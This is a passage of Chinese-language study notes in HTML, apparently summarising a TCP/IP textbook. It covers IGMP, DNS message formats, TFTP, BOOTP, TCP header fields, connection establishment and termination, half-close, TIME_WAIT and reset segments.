<li>进程离开一个组时，主机不发送IGMP报告，即便是组中的最后一个进程离开。主机知道在确定的组中已不再有组成员后，在随后收到的IGMP查询中就不再发送报告报文。</li>
<li>多播路由器定时发送IGMP查询来了解是否还有任何主机包含有属于多播组的进程。多播路由器必须向每个接口发送一个IGMP查询。因为路由器希望主机对它加入的每个多播组均发回一个报告，因此IGMP查询报文中的组地址被设置为0。</li>
<li>主机通过发送IGMP报告来响应一个IGMP查询，对每个至少还包含一个进程的组均要发回IGMP报告。</li>
</ul>
<p>使用这些查询和报告报文，多播路由器对每个接口保持一个表，表中记录接口上至少还包含一个主机的多播组（多播路由只关心是不是至少有一个，有一个就得转发）。当路由器收到要转发的多播数据报时，它只将该数据报转发到（使用相应的多播链路层地址）还拥有属于那个组主机的接口上。</p>
<p>如图：查询和报告的报文。显示了两个IGMP报文，一个是主机发送的报告，另一个是路由器发送的查询。该路由器正在要求那个接口上的每个主机说明它加入的每个多播组</p>
<p><img src="http://images2015.cnblogs.com/blog/680022/201604/680022-20160407123400375-1952921020.png" alt=""></p>
<h2 id="实现细节"><a href="#实现细节" class="headerlink" title="实现细节"></a>实现细节</h2><p>实现IGMP的几个细节：</p>
<ul>
<li>当一个主机首次发送IGMP报告（当第一个进程加入一个多播组）时，并不保证该报告被可靠接收（因为使用的是IP交付服务）。下一个报告将在间隔一段时间后发送。这个时间间隔由主机在 0 ~ 1 0秒的范围内随机选择。 </li>
<li>当一个主机收到一个从路由器发出的查询后，并不立即响应，而是经过一定的时间间隔后才发出一些响应s（一个主机可能不止一个多播组，有几个就要发送几个响应）。</li>
</ul>
<h1 id="DNS：域名系统"><a href="#DNS：域名系统" class="headerlink" title="DNS：域名系统"></a>DNS：域名系统</h1><h2 id="引言-2"><a href="#引言-2" class="headerlink" title="引言"></a>引言</h2><p>域名系统（DNS）是一种用于TCP/IP应用程序的分布式数据库，它提供主机名字和IP地址之间的转换及有关电子邮件的选路信息。</p>
<h2 id="DNS基础"><a href="#DNS基础" class="headerlink" title="DNS基础"></a>DNS基础</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501144713.jpg" alt=""></p>
<ul>
<li>DNS的名字空间和Unix的文件系统相似，也具有层次结构</li>
<li>每个结点（图14-1中的圆圈）有一个至多63个字符长</li>
<li>以点“.”结尾的域名称为绝对域名或完全合格的域名FQDN(Full Qualified Domain Name)</li>
<li><p>顶级域名被分为三个部分：<br>  1）arpa是一个用做地址到名字转换的特殊域<br>  2）7个3字符长的普通域，也称组织域<br>  3）所有2字符长的域均是基于ISO3166中定义的国家代码，这些域称为国家域，或地理域<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501144946.jpg" alt=""></p>
</li>
<li><p>一个独立管理的DNS子树称为一个区域（zone）</p>
</li>
<li>DNS的一个基本特征是使用超高速缓存。即当一个名字服务器收到有关映射的信息（主机名字到IP地址）时，它会将该信息存放在高速缓存中。这样若以后遇到相同的映射请求，就能直接使用缓存中的结果而不需通过其他服务器查询</li>
</ul>
<h2 id="DNS的报文格式"><a href="#DNS的报文格式" class="headerlink" title="DNS的报文格式"></a>DNS的报文格式</h2><p>DNS定义了一个用于查询和响应的报文格式。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501145012.jpg" alt=""></p>
<ul>
<li>这个报文由12字节长的首部和4个长度可变的字段组成</li>
<li>标识字段由客户程序设置并有服务器返回结果。客户程序通过它来确定响应与查询是否匹配</li>
<li>16bit的标志字段被划分为若干子字段<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501145036.jpg" alt=""><br>   1）QR是1bit字段：0表示查询报文，1表示响应报文<br>   2）opcode是一个4bit字段：通常值为0（标准查询），其他值为1（反向查询）和2（服务器状态请求）<br>   3）AA是1bit标志，表示“授权回答”。该名字服务器是授权于该域的<br>   4）TC是1bit字段，表示“可截断的”。使用UDP时，它表示当应答的总长度超过512字节时，只返回前512个字节<br>   5）RD是1bit字段表示“期望递归”。该比特能在一个查询中设置，并在响应中返回。这个标志告诉名字服务必须处理这个查询，也称为一个递归查询。<br>   6）RA是1bit字段，表示“可用递归”。如果名字服务器支持递归查询，则在响应中该比特设置为1.<br>   7）随后的3bit字段必须为0<br>   8）recode是一个4bit的返回码字段。通常的值为0（没有差错）和3（名字差错）。名字差错只有从一个授权名字服务器上返回，它表示在查询中指定的域名不存在<br>   9）随后的4个16bit字段说明最后4个变长字段中包含的条目数。对于查询报文，问题数通常为1，而其他3项则均为0.</li>
</ul>
<h3 id="DNS查询报文中的问题部分"><a href="#DNS查询报文中的问题部分" class="headerlink" title="DNS查询报文中的问题部分"></a>DNS查询报文中的问题部分</h3><p>问题部分中每个问题的格式如图14-5所示，通常只有一个问题<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501145102.jpg" alt=""></p>
<ul>
<li>查询名是要查找的名字，它是一个或多个标识符的序列。每个标识符以首字节的计数值来说明随后标识符的字节长度，每个名字以最后字节为0结束，长度为0的标识符是根标识符。计数字节的值必须是0-63的数，因为标识符最大长度仅为63.</li>
<li>每个问题有一个查询类型，而每个响应（也称一个资源记录）也有一个类型。</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501145125.jpg" alt=""></p>
<ul>
<li>最常用的查询类型是A类型，表示期望获得查询名的IP地址。一个PTR查询则请求获得一个IP地址对应的域名</li>
<li>查询类通常是1，指互联网地址</li>
</ul>
<h3 id="DNS响应报文中的资源记录部分"><a href="#DNS响应报文中的资源记录部分" class="headerlink" title="DNS响应报文中的资源记录部分"></a>DNS响应报文中的资源记录部分</h3><p>DNS报文中最后的是三个字节，回答字段、授权字段和附加信息字段，均采用一种称为资源记录RR的相同格式。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501145150.jpg" alt=""></p>
<ul>
<li>域名是记录中资源数据对应的名字</li>
<li>类型说明RR的类型码。它的值和查询类型值是一样的，类通常为1，值Internet数据</li>
<li>生成时间字段是客户程序保留该资源记录的秒数，通常的生成时间自为2天</li>
<li>资源数据长度说明资源的数量</li>
</ul>
<h2 id="指针查询"><a href="#指针查询" class="headerlink" title="指针查询"></a>指针查询</h2><ul>
<li>即给定一个IP地址，返回与该地址对应的域名</li>
<li>查询结果包含一个回答RR，且为授权回答比特置1.RR的类型是PTR，资源数据中包含该域名</li>
</ul>
<h2 id="主机名检查"><a href="#主机名检查" class="headerlink" title="主机名检查"></a>主机名检查</h2><p>当一个IP数据报到达一个作为服务器的主机时，无论是UDP数据报还是TCP连接请求，服务器进程所能获得的是客户的IP地址和端口号（UDP和TCP）。</p>
<h2 id="资源记录"><a href="#资源记录" class="headerlink" title="资源记录"></a>资源记录</h2><p>资源记录（RR）：IP地址查询为A类型，指针查询为类型FTR。由名字服务器返回的资源记录：回答RR、授权RR和附加信息RR。现有大约20种不同类型的资源记录。</p>
<ul>
<li>A：一个A记录定义了一个IP地址，它存储32bit的二进制数</li>
<li>PTR：指针记录用于指针查询</li>
<li>CNAME：这表示“规范名字（canonical name）”。它用来表示一个域名，而有规范名字的域名通常被称为别名</li>
<li>HINFO:表示主机信息：包括说明主机CPU和操作系统的两个字符串。并非所有的站点均提供它们系统的HINFO记录，并且提供的信息也可能不是最新的</li>
<li>MX:邮件交换记录</li>
<li>NS:名字服务器记录</li>
</ul>
<h2 id="高速缓存"><a href="#高速缓存" class="headerlink" title="高速缓存"></a>高速缓存</h2><ul>
<li>为了减少Internet上DNS的通信量，所有的名字服务器均使用高速缓存。</li>
<li>在标准的Unix实现中，高速缓存是由名字服务器而不是由名字解析器维护的。</li>
</ul>
<h1 id="TFTP：简单文件传送协议"><a href="#TFTP：简单文件传送协议" class="headerlink" title="TFTP：简单文件传送协议"></a>TFTP：简单文件传送协议</h1><h2 id="引言-3"><a href="#引言-3" class="headerlink" title="引言"></a>引言</h2><ul>
<li>TFTP（Trivial File Transfer Protocol）即简单文件传送协议，最初打算用于引导无盘系统</li>
<li>TFTP使用UDP</li>
<li>TFTP的代码（和它需要的UDP、IP和设备驱动程序）都能适合只读存储器</li>
</ul>
<h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><ul>
<li>在开始工作时，T F T P的客户与服务器交换信息，客户发送一个读请求或写请求给服务器。在一个无盘系统进行系统引导的正常情况下，第一个请求是读请求（ R R Q）。</li>
<li>T F T P报文的头两个字节表示操作码。对于读请求和写请求（ W R Q），文件名字段说明客户要读或写的位于服务器上的文件。这个文件字段以 0字节作为结束（见图 1 5 - 1）。模式字段是一个A S C I I码串n e t a s c i i或o c t e t（可大小写任意组合），同样以0字节结束。n e t a s c i i表示数据是以成行的A S C I I码字符组成，以两个字节 — 回车字符后跟换行字符（称为C R / L F）作为行结束符。</li>
<li>每个数据分组包含一个块编号字段，它以后要在确认分组中使用。</li>
<li>在写请求的情况下，TFTP 客户发送W R Q指明文件名和模式。如果该文件能被 该客户写，TFTP 服务器就返回块编号为 0的A C K包。该客户就将文件的头 5 1 2字节以块编号为1发出。服务器则返回块编号为1的A C K。这种类型的数据传输称为停止等待协议。</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501150021.jpg" alt=""></p>
<ul>
<li>最后一种T F T P报文类型是差错报文，它的操作码为 5。它用于服务器不能处理读请求或写请求的情况。在文件传输过程中的读和写差错也会导致传送这种报文，接着停止传输。差错编号字段给出一个数字的差错码，跟着是一个 A S C I I表示的差错报文字段，可能包含额外的操作系统说明的信息。</li>
<li>既然T F T P使用不可靠的U D P，T F T P就必须处理分组丢失和分组重复。分组丢失可通过发送方的超时与重传机制解决（注意存在一种称为“魔术新手综合症 ( s o r c e r e r’s apprentices y n d r o m e )”的潜在问题，如果双方都超时与重传，就可能出现这个问题。</li>
</ul>
<h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><ul>
<li>在T F T P分组（图1 5 - 1）中并不提供用户名和口令。这是 T F T P的一个特征（即“安全漏洞”）。由于T F T P是设计用于系统引导进程，它不可能提供用户名和口令。</li>
<li>目前大多数 T F T P服务器提供了一个选项来限制只能访问特定目录下的文件（U n i x系统中通常是/ t f t p b o o t）。这个目录中只包含无盘系统进行系统引导时所需的文件</li>
</ul>
<h1 id="BOOTP：引导程序协议"><a href="#BOOTP：引导程序协议" class="headerlink" title="BOOTP：引导程序协议"></a>BOOTP：引导程序协议</h1><h2 id="引言-4"><a href="#引言-4" class="headerlink" title="引言"></a>引言</h2><ul>
<li>无盘系统在不知道自身IP地址的情况下，在进行系统引导时能够通过RARP来获取它的IP地址。然而使用RARP有两个问题：（1）I P地址是返回的唯一结果；（2）既然R A R P使用链路层广播， R A R P请求就不会被路由器转发（迫使每个实际网络设置一个RARP 服务器）</li>
<li>BOOTP（引导程序协议）是一种用于无盘系统进行系统引导的替代方法</li>
<li>BOOTP使用UDP，且通常需与TFTP协同工作</li>
</ul>
<h2 id="BOOTP的分组格式"><a href="#BOOTP的分组格式" class="headerlink" title="BOOTP的分组格式"></a>BOOTP的分组格式</h2><p>BOOTP 请求和应答均被封装在U D P数据报中，如图1 6 - 1所示。<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501151809.jpg" alt=""></p>
<p>图1 6 - 2显示了长度为3 0 0字节的B O O T P请求和应答的格式。<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501151910.jpg" alt=""></p>
<ul>
<li>“操作码”字段为1表示请求，为2表示应答。硬件类型字段为 1表示10 Mb/s的以太网</li>
<li>“跳数”字段由客户设置为0，但也能被一个代理服务器设置</li>
<li>“事务标识”字段是一个由客户设置并由服务器返回的 32 bit整数。客户用它对请求和应答进行匹配。对每个请求，客户应该将该字段设置为一个随机数。    </li>
<li>客户开始进行引导时，将“秒数”字段设置为一个时间值。服务器能够看到这个时间值，备用服务器在等待时间超过这个时间值后才会响应客户的请求，这意味着主服务器没有启动。</li>
<li>如果该客户已经知道自身的 I P地址，它将写入“客户 I P地址”字段。否则，它将该字段设置为0。对于后面这种情况，服务器用该客户的 I P地址写入“你的 I P地址”字段。“服务器I P地址”字段则由服务器填写。如果使用了某个代理服务器（见 1 6 . 5节），则该代理服务器就填写“网关I P地址”字段。</li>
<li>客户必须设置它的“客户硬件地址”字段。尽管这个值与以太网数据帧头中的值相同，U D P数据报中也设置这个字段，但任何接收这个数据报的用户进程能很容易地获得它（例如一个BOOTP 服务器）。一个进程通过查看U D P数据报来确定以太网帧首部中的该字段通常是很困难的（或者说是不可能的）。</li>
<li>“服务器主机名”字段是一个空值终止串，由服务器填写。服务器还将在“引导文件名字段”填入包括用于系统引导的文件名及其所在位置的路径全名。</li>
<li>“特定厂商区域”字段用于对B O O T P进行不同的扩展。</li>
</ul>
<h3 id="端口号-1"><a href="#端口号-1" class="headerlink" title="端口号"></a>端口号</h3><p>B O O T P有两个熟知端口：BOOTP 服务器为6 7，BOOTP 客户为6 8。</p>
<h1 id="TCP：传输控制协议"><a href="#TCP：传输控制协议" class="headerlink" title="TCP：传输控制协议"></a>TCP：传输控制协议</h1><h2 id="TCP的服务"><a href="#TCP的服务" class="headerlink" title="TCP的服务"></a>TCP的服务</h2><ul>
<li>TCP提供一种面向连接的、可靠的字节流服务</li>
<li>面向连接意味着两个使用TCP的应用（通常是一个客户和一个服务器）在彼此交换数据之间必须先建立一个TCP连接</li>
<li>在一个TCP连接中，仅有两方进行彼此通信</li>
</ul>
<h3 id="TCP通过下列方式来提供可靠性"><a href="#TCP通过下列方式来提供可靠性" class="headerlink" title="TCP通过下列方式来提供可靠性"></a>TCP通过下列方式来提供可靠性</h3><ul>
<li>应用数据被分隔成TCP认为最适合发送的数据块</li>
<li>当TCP发出一个段后，它启动一个定时器，等待目的端确认收到这个报文段。如果不能及时收到一个确认，将重发这个报文段</li>
<li>当TCP收到发自TCP连接另一端的数据，它将发送一个确认。这个确认不是立即发送，通常将推迟几分之一秒</li>
<li>TCP将保持它首部和数据的检验和</li>
<li>既然TCP报文段作为IP数据报来传输，而IP数据报的到达可能会失序，因此TCP报文段的到达可能会失序。如果必要，TCP将对收到的数据进行重新排序，将收到的数据以正确的顺序交给应用层</li>
<li>既然IP数据报会发生重复，TCP的接收端必须丢弃重复的数据</li>
<li>TCP还能提供流量控制。TCP连接的每一方都有固定大小的缓冲空间。TCP的接收端只允许另一端发送接收端缓冲区所能接纳的数据。这将防止较快主机致使较慢主机的缓冲区溢出</li>
</ul>
<h3 id="TCP的字节流"><a href="#TCP的字节流" class="headerlink" title="TCP的字节流"></a>TCP的字节流</h3><ul>
<li>两个应用程序通过TCP连接交换8 bit构成的字节流。TCP不在字节流中插入记录标识符。将这称为字节流服务。</li>
<li>假设一方的应用程序先传10字节，又传20字节，再传50字节，连接的另一方将无法了解发方每次发送了多少字节。收方可以分4次接收这80个字节，每次接收20字节。</li>
<li>TCP对字节流的内容不作任何解释，它不知道传输的数据字节流是二进制数据、ASCII字符、EBCDIC字符或其他类型数据。由TCP双方的应用层对字节流进行解释。</li>
</ul>
<h2 id="TCP的首部"><a href="#TCP的首部" class="headerlink" title="TCP的首部"></a>TCP的首部</h2><p>TCP数据被封装在一个IP数据报中<br><img src="http://images.cnitblog.com/blog2015/697266/201504/221940145468929.png" alt=""></p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/221941291718831.png" alt=""></p>
<ul>
<li>每个TCP段都包含源端和目的端的端口号，用于寻找发端和收端应用进程。这两个值加上IP首部中的源端IP地址和目的端IP地址唯一确定一个TCP连接</li>
<li>一个IP地址和一个端口号也称为一个插口（socket）。插口对（socket pair）（包含客户IP地址、客户端口号、服务器IP地址和服务器端口号的四元组）可唯一确定互联网网络中每一个TCP连接的双方</li>
<li>序号用来标识从TCP发端向收端发送的数据字节流。如果将字节流看作是在两个应用程序间的单向流动，则TCP用序号对每个字节进行计数。序号是32 bit的无符号数，到达2^32-1后又从0开始。SYN标志消耗了一个序号</li>
<li>因为每个传输的字节都被计数，确认序号包含发送确认的一端所期望收到的下一个序号，即确认序号是上次已成功收到数据字节序号加1。只有ACK标志为1时确认序号字段才有效</li>
<li>发送ACK无需占用任何序号，因为32 bit的确认序号字段和ACK标志一样，总是TCP首部的一部分。因此，一旦一个连接建立起来，这个字段总是被设置，ACK标志也总是被设置为1。</li>
<li>首部长度给出首部中32 bit字的数目。需要这个值是因为任选字段的长度是可变的。这个字段占4 bit，因此TCP最多有60字节的首部（32bit*(2^4-1)）。如果没有选项字段，正常的长度是20字节。</li>
<li>TCP为应用层提供全双工服务。这意味数据能在两个方向上独立地进行传输。因此，连接的每一端必须保持每个方向上的传输数据序号</li>
<li>TCP的流量控制由连接的每一端通过声明的窗口大小来提供。窗口大小为字节数，起始于确认序号字段指明的值，这个值是接收端期望接收的字节。窗口大小是一个16 bit字段，因而窗口大小最大为65535字节。</li>
<li>检验和覆盖了整个TCP报文段包括TCP首部和TCP数据。这是一个强制性的字段，一定是由发端计算和存储，并由收端进行验证。<br>说明：TCP检验和的计算与UDP检验和的计算相似，使用一个伪首部。</li>
<li>只有当URG标志置1时紧急指针才有效。紧急指针是一个正的偏移量，和序号字段中的值相加表示紧急数据最后一个字节的序号。TCP的紧急方式是发送端向另一端发送紧急数据的一种方式。</li>
<li>最常见的选项字段是最长报文大小，又称为MSS (Maximum Segment Size)。每个连接方通常都在通信的第一个报文段（为建立连接而设置SYN标志的那个段）中指明这个选项。它指明本端所能接收的最大长度的报文段。</li>
<li>TCP报文段中的数据部分是可选的。例如：一个连接建立和终止时，双方交换的报文段仅有TCP首部。在处理超时的许多情况中，也会发送不带任何数据的报文段。</li>
</ul>
<h3 id="TCP首部中有6个标志比特"><a href="#TCP首部中有6个标志比特" class="headerlink" title="TCP首部中有6个标志比特"></a>TCP首部中有6个标志比特</h3><p>可同时多个被设置为1</p>
<ul>
<li>URG        紧急指针有效</li>
<li>ACK        确认序号有效</li>
<li>PSH        接收方应该尽快将这个报文段交给应用层</li>
<li>PST        重建连接</li>
<li>SYN        同步序号用来发起一个连接。</li>
<li>FIN        发端完成发送任务</li>
</ul>
<h1 id="TCP连接的建立与终止"><a href="#TCP连接的建立与终止" class="headerlink" title="TCP连接的建立与终止"></a>TCP连接的建立与终止</h1><h2 id="引言-5"><a href="#引言-5" class="headerlink" title="引言"></a>引言</h2><ul>
<li>TCP是一个面向连接的协议。无论哪一方向另一方发送数据之前，都必须先在双方之间<br>建立一条连接。本章将详细讨论一个 T C P连接是如何建立的以及通信结束后是如何终止的。</li>
<li>这种两端间连接的建立与无连接协议如 U D P不同。我们在第 11章看到一端使用U D P向另<br>一端发送数据报时，无需任何预先的握手。</li>
</ul>
<h2 id="建立连接协议"><a href="#建立连接协议" class="headerlink" title="建立连接协议"></a>建立连接协议</h2><h3 id="建立连接协议-1"><a href="#建立连接协议-1" class="headerlink" title="建立连接协议"></a>建立连接协议</h3><p>如18-3所示，为了建立一条TCP连接：<br><img src="http://images.cnitblog.com/blog2015/697266/201504/222117276092162.png" alt=""></p>
<ul>
<li>请求端（客户）发送一个SYN段指明客户打算连接的服务器的端口，以及初始序号（ISN，例子中为1415531521），如报文1。</li>
<li>服务器发回包含服务器的初始序号的SYN报文段（报文段2）作为应答。同时，将确认序号设置为客户的ISN加1以对客户的SYN报文段进行确认。一个SYN将占用一个序号。</li>
<li>客户必须将确认序号设置为服务器的ISN加1以对服务器的SYN报文段进行确认（报文段3）。</li>
</ul>
<p>这三个报文段完成连接的建立，这个过程也称为三次握手。</p>
<p>说明：</p>
<ul>
<li><p>发送第一个SYN的一端将执行主动打开，接收这个SYN并发回下一个SYN的另一端执行被动打开。</p>
</li>
<li><p>当一端为建立连接而发送它的SYN时，它为连接选择一个初始序号。ISN随时间而变化，因此每个连接都将具有不同的ISN。</p>
</li>
</ul>
<h3 id="终止连接"><a href="#终止连接" class="headerlink" title="终止连接"></a>终止连接</h3><p>终止一个连接要经过4次握手。这是由TCP的半关闭造成的。<br>说明：</p>
<ul>
<li>因为TCP是全双工的（数据在两个方向上能同时传递），因此每个方向必须单独进行关闭。原则是：当一方完成它的数据发送任务后发送一个FIN来终止这个方向连接。当一端收到一个FIN时，它必须通知应用层另一端已经终止了那个方向的数据传送。</li>
</ul>
<p>注意：发送FIN通常是应用层进行关闭的结果。</p>
<ul>
<li>收到一个FIN只意味着在这一方向上没有数据流动。</li>
</ul>
<p>注意：一个TCP连接在收到一个FIN后仍能发送数据，这对利用半关闭的应用来说是可能的，尽管在实际应用中只有很少的TCP应用程序这样做。</p>
<p>图18-4显示了终止一个连接的典型握手顺序。<br><img src="http://images.cnitblog.com/blog2015/697266/201504/222146082184141.png" alt=""><br>发送FIN将导致应用程序关闭它们的连接，这些FIN的ACK是由TCP软件自动产生的。</p>
<h2 id="最大报文段长度"><a href="#最大报文段长度" class="headerlink" title="最大报文段长度"></a>最大报文段长度</h2><ul>
<li>最大报文段长度（MSS）表示TCP传往另一端的最大块数据的长度。当一个连接建立时，连接的双方都要通告各自的MSS。</li>
<li>当建立一个连接时，每一方都有用于通告它期望接收的MSS选项（MSS选项只能出现在SYN报文段中）。如果一方不接收来自另一-*    方的MSS值，则MSS就定为默认值536字节（这个默认值允许20字节的IP首部和20字节的TCP首部以适合576字节IP数据报。</li>
</ul>
<p>注意：</p>
<p>（1）一般说来，如果没有分段发生，MSS越大越好。报文段越大允许每个报文段传送的数据就越多，相对IP和TCP首部有更高的网络利用率。</p>
<p>（2）当TCP发送一个SYN时，或者是因为一个本地应用进程想发起一个连接，或者是因为另一端的主机收到了一个连接请求，它能将MSS值设置为外出接口上的MTU长度减去固定的IP首部和TCP首部长度。</p>
<p>（3）如果目的IP地址为“非本地的(non-local)”，MSS通常的默认值为536。</p>
<p>说明：区分地址是本地还是非本地的方法是：如果目的IP地址的网络号与子网号都与本机相同，则是本地的；如果目的IP地址的网络号与本机相同而子网号不同，则可能是本地的，也可能是非本地的。</p>
<p>（4）MSS使得主机限制另一端发送数据报的长度。加上主机也能控制它发送数据报的长度，这使得以较小MTU连接到一个网络上的主机避免分段。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/241932528289870.png" alt=""><br>主机sun向slip发起一个TCP连接，利用tcpdump命令来观察报文段：<br><img src="http://images.cnitblog.com/blog2015/697266/201504/241934592035362.png" alt=""></p>
<p>说明：</p>
<p>（1）sun发送的报文段不能超过256字节的数据，因为slip已经告知它的MSS值为256。（上图第二个红框）</p>
<p>（2）slip知道它外出接口的MTU长度为296，所以即使sun已经告诉它的MSS为1460（上图第一个红框），但为避免将数据分段，它不会发送超过256字节数据的报文段。</p>
<p>（<br>3）如果两端主机都连接到以太网上，都采用536的MSS，但中间网络采用296的MTU，同样会出现分段。</p>
<h2 id="TCP的半关闭"><a href="#TCP的半关闭" class="headerlink" title="TCP的半关闭"></a>TCP的半关闭</h2><p>TCP提供了连接的一端在结束它的发送后还能接收来自另一端数据的能力，即半关闭。</p>
<p>注意：很少有应用程序使用它，如果想要使用这个功能，需要编程接口提供一个方式来说明。</p>
<p>下面给出一个例子：</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/241948297963788.png" alt=""></p>
<p>意思是这样的：客户结束了发送数据（发送了FIN），服务器发送ACK表示确认后，仍然可以发送数据给客户（图中红框）。</p>
<h2 id="TCP的状态变迁图"><a href="#TCP的状态变迁图" class="headerlink" title="TCP的状态变迁图"></a>TCP的状态变迁图</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/241955122346274.png" alt=""></p>
<h3 id="2MSL等待状态"><a href="#2MSL等待状态" class="headerlink" title="2MSL等待状态"></a>2MSL等待状态</h3><p>TIME_WAIT状态也称为2MSL等待状态。每个具体TCP实现必须选择一个报文段最大生存时间MSL（Maximum Segment Lifetime）。它是任何报文段被丢弃前在网络内的最长时间。</p>
<p>注意：MSL是个有限的时间，我们知道TCP报文段以IP数据报在网络中传输，IP数据报是由TTL字段限制其生存时间的。RFC 793指出MSL为2分钟。实现中的常用值是30秒，1分钟，或2分钟。</p>
<p>对于给定的MSL值，原则是：当TCP执行一个主动关闭，并发回最后一个ACK，该连接必须在TIME_WAIT状态停留的时间为2倍的MSL。这样可让TCP再次发送最后的ACK以防这个ACK丢失（另一端超时并重发最后的FIN）。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/242008047654027.png" alt=""></p>
<p>说明：</p>
<p>1）客户执行主动关闭并进入TIME_WAIT是正常的。服务器通常执行被动关闭，不会进入TIME_WAIT状态。</p>
<p>2）TCP连接在2MSL等待期间，这个连接的socket（客户的IP地址和端口号，服务器的IP地址和端口号）不能再被使用。这个连接只能在2MSL结束后才能再被使用。</p>
<h3 id="平静时间的概念"><a href="#平静时间的概念" class="headerlink" title="平静时间的概念"></a>平静时间的概念</h3><p>如果处于2MSL等待端口的主机出现故障，它会在MSL秒内重新启动，并立即使用故障前处于2MSL的socket来建立一个新的连接。在故障前从这个连接发出而迟到的报文段会被错误地当作属于重启后新连接的报文段。</p>
<p>为了防止这种情况，RFC 793指出TCP在重启动后的MSL秒内不能建立任何连接，称为平静时间(quiet time)。</p>
<h3 id="FIN-WAIT-2状态"><a href="#FIN-WAIT-2状态" class="headerlink" title="FIN_WAIT_2状态"></a>FIN_WAIT_2状态</h3><p>如上面的图所示：FIN_WAIT_2状态时，客户已经发出了FIN，另一端也已对它进行确认。</p>
<p>除非客户设置了半关闭，否则将等待另一端的应用层意识到它已收到一个文件结束符说明，并向我们发一个FIN 来关闭连接。只有这样，我们这端才会从FIN_WAIT_2状态进入TIME_WAIT状态。</p>
<h2 id="复位报文段"><a href="#复位报文段" class="headerlink" title="复位报文段"></a>复位报文段</h2><p>TCP首部中的RST比特是用于“复位”的，一般无论何时一个报文段发往“基准连接”出现错误，TCP都会发出一个复位报文段。</p>
<p>说明：“基准连接”是指由目的IP地址和端口号以及源IP地址和端口号指明的连接。</p>
<h3 id="到不存在的端口的连接请求"><a href="#到不存在的端口的连接请求" class="headerlink" title="到不存在的端口的连接请求"></a>到不存在的端口的连接请求</h3><p>产生复位的一种常见情况是当连接请求到达时，目的端口没有进程正在听。</p>
<p>注意：对于UDP，当一个数据报到达目的端口时，该端口没在使用，它将产生一个ICMP端口不可达的信息；对于TCP，则使用复位。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/242052314061888.png" alt=""></p>
<p>图中的意思是说：主机bsdi向svr4的20000端口发送SYN，然后svr4告诉bsdi一个复位连接的信息。</p>
<h3 id="异常终止一个连接"><a href="#异常终止一个连接" class="headerlink" title="异常终止一个连接"></a>异常终止一个连接</h3><p>终止一个连接的正常方式是一方发送FIN。这也称为有序释放，因为在所有排队数据都已发送之后才发送FIN，正常情况下没有任何数据丢失。但也有可能发送一个复位报文段而不是FIN来中途释放一个连接。这也称为为异常释放。</p>
<p>异常终止一个连接对应用程序来说有两个优点：</p>
<p>1）丢弃任何待发数据并立即发送复位报文段；</p>
<p>2）RST的接收方会区分另一端执行的是异常关闭还是正常关闭。</p>
<p>特别注意：RST报文段不会导致另一端产生任何响应，另一端根本不进行确认。收到RST的一方将终止该连接，并通知应用层连接复位。</p>
<h3 id="检测半打开连接"><a href="#检测半打开连接" class="headerlink" title="检测半打开连接"></a>检测半打开连接</h3><p>如果一方已经关闭或异常终止连接而另一方却还不知道，将这样的TCP连接称为半打开的。</p>
<p>说明：</p>
<p>1）任何一端的主机异常都可能导致半打开连接。只要不在半打开连接上传输数据，仍处于连接状态的一方就不会检测到另一方已经出现异常。</p>
<p>2）半打开连接的另一个常见原因是当客户主机突然掉电而不是正常的结束客户应用程序后再关机。</p>
<h2 id="同时打开"><a href="#同时打开" class="headerlink" title="同时打开"></a>同时打开</h2><p>两个应用程序同时彼此执行主动打开的情况是可能的，尽管发生的可能性极小。每一方必须发送一个SYN，且这些SYN必须传递给对方。这需要每一方使用一个对方熟知的端口作为本地端口，称为同时打开。</p>
<p>TCP对于同时打开仅建立一条连接而不是两条连接。当出现同时打开时：</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/242113260463855.png" alt=""></p>
<p>两端几乎同时发送SYN，并进入SYN_SENT状态。当每一端收到SYN时，状态变为SYN_RCVD，同时它们都再发SYN并对收到的SYN进行确认。当双方都收到SYN及相应的ACK时，状态都变迁为ESTABLISHED。</p>
<p>注意：</p>
<p>（1）一个同时打开的连接需要交换4个报文段，比正常的三次握手多一个。</p>
<p>（2）对于同时打开的连接，我们没有将任何一端称为客户或服务器，因为每一端既是客户又是服务器。</p>
<h2 id="同时关闭"><a href="#同时关闭" class="headerlink" title="同时关闭"></a>同时关闭</h2><p>双方都执行主动关闭也是可能的，TCP也允许同时关闭。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/242119433438389.png" alt=""></p>
<p>同时关闭过程为：</p>
<p>（1）当应用层发出关闭命令时，两端均从ESTABLISHED变为FIN_WAIT_1。这将导致双方各发送一个FIN，两个FIN经过网络传送后分别到达另一端。</p>
<p>（2）收到FIN后，状态由FIN_WAIT_1变为CLOSING，并发送最后的ACK。</p>
<p>（3）当收到最后的ACK时，状态变化为TIME_WAIT。</p>
<p>注意：同时关闭和正常关闭报文段交换数目相同。</p>
<h2 id="TCP选项"><a href="#TCP选项" class="headerlink" title="TCP选项"></a>TCP选项</h2><p>TCP首部可以包含选项部分。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/242127116875983.png" alt=""></p>
<p>选项说明：</p>
